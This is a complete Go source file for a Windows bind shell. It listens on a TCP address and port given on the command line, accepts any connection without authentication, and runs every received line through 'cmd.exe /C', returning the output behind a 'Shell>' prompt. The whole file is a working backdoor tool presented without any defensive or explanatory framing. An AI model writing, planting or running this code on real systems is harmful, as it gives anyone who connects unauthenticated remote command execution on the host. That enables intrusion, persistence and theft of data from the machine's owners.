package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Usage: %s LHOST LPORT\n", os.Args[0])
		os.Exit(1)
	}

	LHOST := os.Args[1]
	LPORT := os.Args[2]

	address := fmt.Sprintf("%s:%s", LHOST, LPORT)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Printf("Error starting listener: %s\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("Listening on %s...\n", address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Printf("Error accepting connection: %s\n", err)
			continue
		}

		fmt.Println("Connection established!")
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	conn.Write([]byte("Shell> "))
	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Connection closed: %s\n", err)
			return
		}

		command = command[:len(command)-1] // Remove newline character
		if command == "exit" {
			fmt.Println("Client disconnected.")
			return
		}

		cmd := exec.Command("cmd.exe", "/C", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = []byte(fmt.Sprintf("Error executing command: %s\n", err))
		}

		conn.Write(output)
		conn.Write([]byte("Shell> "))
	}
}
